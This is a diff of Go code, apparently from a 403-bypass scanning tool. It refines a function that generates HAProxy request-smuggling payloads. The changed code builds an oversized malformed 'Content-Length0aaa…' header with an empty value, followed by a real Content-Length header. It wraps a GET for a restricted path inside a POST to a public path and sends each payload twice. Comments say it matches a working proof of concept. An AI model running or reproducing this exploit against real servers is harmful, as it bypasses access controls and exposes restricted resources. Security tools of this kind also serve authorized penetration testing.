@@ -39,68 +39,27 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 		path += "?" + parsedURL.Query
 	}
 
-	// We'll test various public endpoints before the restricted one
-	// publicPaths := []string{
-	// 	"/",
-	// 	"/robots.txt",
-	// 	"/index",
-	// 	"/guest",
-	// }
-
+	// Test various public endpoints before the restricted one
 	publicPaths := []string{
 		"/public",
 		"/guest",
 	}
 
-	// Generate overflow pattern - using the exact pattern from the PoC
-	// 217 'a' characters is what's used in the public exploits
-	// User has indicated their specific PoC uses a header name (Content-Length0...:) that totals 271 chars,
-	// implying 255 'a's after "Content-Length0".
+	// Generate overflow pattern - exact pattern from working PoC
+	// Content-Length0 + 256 'a' characters
 	overflowPattern := "0" + strings.Repeat("a", 256)
+	malformedHeaderName := "Content-Length" + overflowPattern
 
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
-		// Craft the smuggled request
+		// Craft the smuggled request - exact format from working PoC
 		smuggledRequest := fmt.Sprintf("GET %s HTTP/1.1\r\nh:GET %s HTTP/1.1\r\nHost: %s\r\n\r\n",
 			path, publicPath, host)
 
-		// Properly calculate the content length dynamically for the *second* Content-Length header:
-		calculatedContentLengthForSecondHeader := len(smuggledRequest)
-		//calculatedContentLengthForSecondHeader := 23
-		//malformedHeaderName := "Content-Length" + overflowPattern + ":"
-		malformedHeaderName := "Content-Length" + overflowPattern //+ ":"
-		//malformedHeaderName := "Content-Length" + overflowPattern + ":"
-		// Create payload with dynamically calculated Content-Length
-		// CRITICAL: The order of headers MUST be preserved exactly as specified here
-		// for this exploit to work. The malformed header MUST be first, followed by
-		// the regular Content-Length header.
-		// job := BypassPayload{
-		// 	OriginalURL:  targetURL,
-		// 	Method:       "POST",
-		// 	Scheme:       parsedURL.Scheme,
-		// 	Host:         host,
-		// 	RawURI:       publicPath,
-		// 	BypassModule: bypassModule,
-		// 	Body:         smuggledRequest,
-		// 	Headers: []Headers{
-		// 		// 1. Malformed header MUST be first - this will be processed first by HAProxy
-		// 		{
-		// 			Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
-		// 			Value:  "0",                 // Empty value, to be handled by BuildRawHTTPRequest
-		// 		},
-		// 		// 2. Regular Content-Length MUST be second - this will be processed by backend server
-		// 		{
-		// 			Header: "Content-Length",
-		// 			Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
-		// 		},
-		// 		// 3. Connection header
-		// 		{
-		// 			Header: "Connection",
-		// 			Value:  "close",
-		// 		},
-		// 	},
-		// }
+		// Calculate the content length for the smuggled request
+		calculatedContentLength := len(smuggledRequest)
 
+		// Create payload matching the working PoC structure
 		job := BypassPayload{
 			OriginalURL:  targetURL,
 			Method:       "POST",
@@ -110,27 +69,24 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			BypassModule: bypassModule,
 			Body:         smuggledRequest,
 			Headers: []Headers{
-				// 1. Malformed header MUST be first - this will be processed first by HAProxy
+				// 1. Malformed header FIRST - NO VALUE after colon (like working PoC)
 				{
-					Header: malformedHeaderName, // e.g., "Content-Length0...<255a's>:"
-					Value:  "0",                 // Empty value, to be handled by BuildRawHTTPRequest
+					Header: malformedHeaderName + ":", // e.g., "Content-Length0aaa...:"
+					Value:  "",                        // EMPTY VALUE - this is critical!
 				},
-				// 2. Regular Content-Length MUST be second - this will be processed by backend server
+				// 2. Real Content-Length will be deferred to LAST position in request.go
 				{
 					Header: "Content-Length",
-					Value:  fmt.Sprintf("%d", calculatedContentLengthForSecondHeader),
-				},
-				// 3. Connection header MUST be close for proper exploit execution
-				{
-					Header: "Connection",
-					Value:  "close",
+					Value:  fmt.Sprintf("%d", calculatedContentLength),
 				},
 			},
 		}
 
 		job.PayloadToken = GeneratePayloadToken(job)
+
+		// Add the job twice - request smuggling often needs multiple attempts
 		allJobs = append(allJobs, job)
-		allJobs = append(allJobs, job) // Add the same job again as per user request
+		allJobs = append(allJobs, job)
 	}
 
 	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) (doubled) for %s", len(allJobs), targetURL)
